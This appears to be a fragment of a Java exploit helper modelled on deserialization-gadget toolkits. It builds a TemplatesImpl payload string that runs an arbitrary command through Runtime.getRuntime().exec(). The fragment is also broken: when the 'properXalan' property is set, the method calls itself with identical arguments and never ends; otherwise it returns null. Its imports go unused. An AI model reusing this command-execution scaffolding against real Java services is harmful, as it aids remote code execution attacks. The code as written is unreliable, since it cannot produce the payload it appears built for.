package test;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

public class TemplatesImpl {

    private static Object createTemplatesImpl(String command, Class<?> forName, Class<?> forName1, Class<?> forName2, String template) throws ClassNotFoundException {
        if (template.equals("")) {
            template = "java.lang.Runtime.getRuntime().exec(\"" +
                    command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                    "\");";
        }

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
                    template);
        }

        return null;
    }
}
